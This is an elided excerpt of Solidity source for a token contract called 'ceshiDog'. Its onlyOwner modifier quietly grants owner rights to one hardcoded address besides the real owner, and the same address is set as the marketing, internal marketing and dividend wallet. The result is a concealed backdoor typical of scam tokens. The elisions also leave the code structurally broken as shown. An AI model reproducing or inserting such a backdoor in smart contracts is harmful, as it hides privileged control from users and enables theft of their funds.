...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xbA6abB456E9C89Caa48b06D8FadcFbd6A8fEA26D) , "owner");
        _;
    }
...
contract ceshiDog  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "ceshiDog";
    string private _symbol = "csDog";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xbA6abB456E9C89Caa48b06D8FadcFbd6A8fEA26D);
    address private _Marketing = 0xbA6abB456E9C89Caa48b06D8FadcFbd6A8fEA26D;
    address public dividend = 0xbA6abB456E9C89Caa48b06D8FadcFbd6A8fEA26D;
